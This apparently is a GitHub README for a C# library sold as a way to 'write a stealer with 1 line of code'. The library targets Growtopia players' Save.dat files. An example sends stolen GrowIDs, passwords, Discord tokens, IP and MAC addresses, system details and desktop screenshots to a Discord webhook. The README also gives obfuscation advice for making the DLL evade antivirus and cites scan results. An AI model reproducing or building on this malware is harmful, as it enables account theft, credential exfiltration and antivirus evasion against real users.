# StealerLibrary
Growtopia (Save.dat) Stealer Library that let you to write a stealer with 1 line of code.

## Compiled Version: [All Releases](https://github.com/extatent/StealerLibrary/releases/)

### Compile the source code with Visual Studio and add the .DLL to the references in your project and start writting the code below.

#### Your program might be FUD, but the .DLL isn't, use any obfuscator to make it FUD. (Used [Agile.Net](https://secureteam.net/acode-features-detailed) Scan Results 0/26) (Without Obfuscator 4/26)

## Example Usage : 

```csharp
using StealerLibrary;
using System;

namespace Example
{
    class Program
    {
        private static void Main()
        {
            Growtopia.Stealer("https://discord.com/api/webhooks/837357864609199746/4wIlD35Q9QNdLGEfd9hWezQX9eAMxCBqDQcMmIBBvAtoKTjDlJAzkMaxyc1kcxaY4TpP", "Webhook Picture Url (Optional)", "Stealer Library", true, false, true, true, false, true, false, true, true);
        }
    }
}
```
1. Webhook Url
2. Webhook Picture Url (Optional)
3. Webhook Name (Optional)
4. Last World (True/False)
5. MAC Address (True/False)
6. IP Address (True/False)
7. Discord Token (True/False)
8. User Name (True/False)
9. Machine Name (True/False)
10. OS Information (True/False)
11. Country (True/False)
12. Desktop Screenshot (True/False)

## Features
### V1
- GrowID
- Password
- Last World (Customizable: True/False)
- MAC Address (Customizable: True/False)
- IP Address (Customizable: True/False)
### V2
- Discord Token (Customizable: True/False)
- User Name (Customizable: True/False)
- Machine Name (Customizable: True/False)
- OS Information (Customizable: True/False)
- Country (Customizable: True/False)
- Desktop Screenshot (Customizable: True/False)

<img src="http://anarchy.5v.pl/example2.png" alt="png">

## StealerLibrary is licensed under the GNU General Public License v3.0. See the [LICENSE](https://github.com/extatent/StealerLibrary/blob/main/LICENSE) file for details.
